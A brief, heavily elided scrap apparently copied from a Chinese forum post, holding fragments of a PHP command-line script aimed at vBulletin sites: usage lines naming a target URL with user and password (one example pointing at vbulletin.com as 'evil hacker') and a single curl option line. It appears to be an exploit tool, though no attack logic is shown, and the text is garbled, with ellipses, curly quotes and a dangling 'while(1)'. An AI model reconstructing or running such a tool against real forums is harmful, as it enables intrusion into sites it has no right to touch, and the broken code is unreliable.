...
> 原文：[https://www.zhihuifly.com/t/topic/3219](https://www.zhihuifly.com/t/topic/3219)
...
print “\nExample…: php $argv[0] [http://localhost/vb/](http://localhost/vb/) user passwd”;

print “\nExample…: php $argv[0] [https://vbulletin.com/](https://vbulletin.com/) evil hacker\n\n”;
...
curl_setopt($ch, CURLOPT_POST, false); `while(1)
